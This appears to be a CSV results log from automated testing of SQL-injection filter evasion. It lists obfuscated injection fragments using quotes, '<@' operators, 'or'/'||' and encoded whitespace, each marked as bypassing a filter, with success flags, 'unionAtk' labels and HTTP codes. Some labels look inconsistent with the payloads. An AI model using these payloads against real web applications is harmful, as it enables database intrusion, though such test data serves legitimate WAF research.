Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.013,72.12,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0209,72.12,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0198,71.73,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0137,71.73,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0174,71.73,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0147,71.73,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0139,71.73,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0118,71.73,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0244,71.73,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0121,71.73,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0109,71.73,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0171,71.75,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0116,71.83,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,72.0,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,72.12,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.018,72.12,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0223,72.12,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0262,72.12,No,500
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.014,72.12,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0168,72.12,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0134,72.12,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0098,72.12,No,200
0%27||%0b@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0236,72.12,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0219,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0182,72.12,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0263,72.12,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0152,72.12,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0179,72.12,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.016,72.12,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.017,72.12,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0127,72.12,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,72.12,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0128,72.12,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.013,72.12,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0152,72.12,No,500
0%27or+@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0117,72.12,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.019,72.12,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0164,72.12,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0126,72.12,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,72.12,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,72.12,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0074,72.12,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0092,72.12,No,500
0%27||+@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0227,72.12,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,72.12,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0087,72.12,No,500
0%27or%0b1<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0073,72.12,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0104,72.12,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,72.12,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0109,72.12,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0147,72.12,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.016,71.73,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,71.73,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0092,71.73,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0142,71.73,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0109,71.73,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0133,71.73,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0321,71.73,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0224,71.73,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.02,71.75,No,200
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0148,71.83,No,500
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,72.12,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.016,72.12,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0186,72.12,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0153,72.12,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0211,72.12,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0242,72.12,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.016,72.12,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0227,72.12,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0166,72.12,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,72.12,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0271,72.12,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0211,72.12,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0177,72.12,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0245,72.12,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0132,72.12,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0263,72.12,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0118,72.12,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0161,72.12,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0217,72.12,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0105,72.12,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0186,72.12,No,500
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0204,72.12,No,500
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0209,72.12,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0103,72.12,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,72.12,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0112,72.12,No,500
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0097,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.01,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0124,72.12,No,200
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0117,72.12,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0099,72.12,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0117,72.12,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0122,72.12,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0114,72.12,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0107,72.12,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0123,72.12,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.017,72.12,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0163,72.12,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0182,72.12,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0119,71.73,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.021,71.73,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.016,71.73,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0226,71.73,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0159,71.73,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.013,71.73,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0139,71.73,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0134,71.73,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0188,71.76,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0159,72.0,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0157,72.12,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0169,72.12,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.022,72.12,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0268,72.12,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0154,72.12,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0266,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0172,72.12,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0119,72.12,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0275,72.12,No,500
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0196,72.12,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0153,72.12,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0134,72.12,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0135,72.12,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0145,72.12,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0306,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.02,72.12,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0159,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0145,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0144,72.12,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0238,72.12,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0161,72.12,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0162,72.12,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0178,72.12,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0155,72.12,No,500
0'or%0b@<@.%0b||,Bypassed,No,None,Unknown,0.0091,72.12,No,500
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0179,72.12,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0111,72.12,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0142,72.12,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0153,72.12,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0132,72.12,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0103,72.12,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0165,72.12,No,200
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0163,72.12,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,72.12,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0149,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0183,72.12,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.015,72.12,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0137,72.12,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,72.12,No,200
0%27||+!@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0188,72.12,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,71.73,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0085,71.73,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0116,71.73,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0235,71.73,No,500
0%27or+@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0247,71.73,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0156,71.73,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.013,71.75,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0167,71.83,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0156,72.0,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0159,72.12,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0173,72.12,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0209,72.12,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0291,72.12,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0229,72.12,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0143,72.12,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0134,72.12,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.025,72.12,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0217,72.12,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,72.12,No,200
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0246,72.12,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0192,72.12,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0197,72.12,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0139,72.12,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.029,72.12,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0175,72.12,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,72.12,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0111,72.12,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.013,72.12,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0128,72.12,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0098,72.12,No,500
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0104,72.12,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0114,72.12,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0104,72.12,No,500
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0125,72.12,No,500
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0148,72.12,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0154,72.12,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0117,72.12,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0128,72.12,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,72.12,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0136,72.12,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0108,72.12,No,500
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,72.12,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,72.12,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.02,72.12,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0171,72.12,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0228,72.12,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0129,72.12,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0125,72.12,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,72.12,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0107,71.73,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0113,71.73,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0116,71.73,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0187,71.73,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0154,71.73,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.014,71.73,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0216,71.75,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0167,71.94,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0101,72.12,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0195,72.12,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0115,72.12,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0146,72.12,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0151,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0277,72.12,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0258,72.12,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0186,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0121,72.12,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.013,72.12,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.026,72.12,No,500
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0124,72.12,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.023,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0255,72.12,No,200
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0179,72.12,No,500
0%27or+@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0197,72.12,No,200
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0207,72.12,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0138,72.12,No,500
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0114,72.12,No,500
0'||+1<@+||,Bypassed,No,None,Unknown,0.0152,72.12,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,72.12,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0205,72.12,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0154,72.12,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0115,72.12,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,72.12,No,200
0%27or+@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.013,72.12,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0108,72.12,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0156,72.12,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0179,72.12,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0168,72.12,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0119,72.12,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0106,72.12,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0124,72.12,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,72.12,No,200
0%27||+@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0091,72.12,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0175,72.12,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.019,72.12,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.01,72.12,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0119,72.12,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0112,72.12,No,500
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,72.12,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0141,72.12,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0173,71.73,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0102,71.73,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0098,71.75,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0132,71.76,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0166,72.0,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,72.12,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0134,72.12,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0168,72.12,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.019,72.12,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0189,72.12,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0187,72.12,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0198,72.12,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0139,72.12,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0145,72.12,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0077,72.12,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0243,72.12,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0199,72.12,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0146,72.12,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.013,72.12,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0185,72.12,No,200
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0124,72.12,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0096,72.12,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0132,72.12,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0175,72.12,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0143,72.12,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0094,72.12,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0182,72.12,No,200
0'||%0b!@<@.+or,Bypassed,No,None,Unknown,0.0113,72.12,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0141,72.12,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0111,72.12,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0108,72.12,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0131,72.12,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0088,72.12,No,500
0%27or+1<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0181,72.12,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0116,72.12,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0142,72.12,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0114,72.12,No,500
0'||+1<@.+||,Bypassed,No,None,Unknown,0.0157,72.12,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0157,72.12,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0135,72.12,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0153,72.12,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0085,72.12,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.008,72.12,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,72.12,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0159,72.12,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0172,72.12,No,200
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.016,72.12,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0175,72.12,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0213,72.12,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0132,71.73,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.017,71.75,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0203,72.0,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0201,72.12,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0121,72.12,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0205,72.12,No,500
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,72.12,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0162,72.12,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,72.12,No,200
